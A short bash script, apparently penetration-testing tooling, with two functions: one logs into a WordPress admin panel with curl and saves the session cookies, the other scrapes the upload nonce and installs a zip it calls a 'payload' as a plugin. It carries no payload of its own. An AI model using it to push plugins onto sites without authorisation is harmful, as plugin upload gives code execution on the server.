#! /bin/bash
# 2022-05-20
# kimm3
# Wordpress helper functions
# Requires curl, sed, cut

function wp_admin_login {
  # Assigning positional args
  username="$1"
  password="$2"
  base_url="$3"
  login_url=$base_url"/wp-login.php"
  admin_url=$base_url"/wp-admin/"
  c_filename="cookies.txt"

  echo "Attempting to login... Saving cookies to '$c_filename'."

  curl \
    -b "wordpress_test_cookie=WP+Cookie+check" \
    --data-urlencode "log=$username" \
    --data-urlencode "pwd=$password" \
    --data-binary 'wp-submit=Log+In' \
    --data-urlencode "redirect_to=$admin_url" \
    --data-binary 'testcookie=1' \
    "$login_url" \
    -c "$c_filename" \
    --output /dev/null -sS \
    --connect-timeout 10

  if [ $? -ne "0" ]
  then
    echo "Curl failed to connect."
    exit 1
  elif ! grep "wordpress_logged_in" $c_filename > /dev/null
  then
    echo "Login not successful, check credentials."
    rm cookies.txt && exit 1
  else
    echo "Login succesful! Session cookies in '$c_filename'"
  fi
}

function wp_upload_plugin {
  # Assigning positional args
  base_url=$1
  payload=$2
  c_filename="cookies.txt"

  echo "Fetching nonce..."
  nonce=$(curl \
    -sS -b cookies.txt \
    $base_url"/wp-admin/plugin-install.php?tab=upload" \
    | sed -n '/<input type="hidden" id="_wpnonce"/p' \
    | cut -d '"' -f 8)
  if [ $nonce ]
  then
    echo "Got nonce: $nonce"
  else
    echo "Getting nonce failed, might be a problem with cookies/credentials."
    exit 1
  fi

  echo "Uploading payload..."
  curl -sS -X 'POST' \
    -b "$c_filename" \
    -F "_wpnonce=$nonce" \
    -F "_wp_http_referer=/wp-admin/plugin-install.php" \
    -F "pluginzip=@$payload;filename=$payload;type=application/zip" \
    -F "install-plugin-submit=Install Now" \
    "$base_url""/wp-admin/update.php?action=upload-plugin" \
    --output /dev/null

    if [ $? -ne "0" ]
    then
      echo "Curl exited with error."
      exit 1
    else
      echo "Payload '$payload' upoaded."
    fi
}
